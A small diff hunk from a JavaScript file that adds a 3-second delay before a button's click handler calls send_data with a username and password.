@@ -49,7 +49,7 @@ btn[1].addEventListener('click', function(){
     setTimeout(function() {
         pwd = send_pwd()
         
-        setTimeout(function(){send_data(user, pwd)})
+        setTimeout(function(){send_data(user, pwd)}, 3000)
     }, 3000);
     
 })
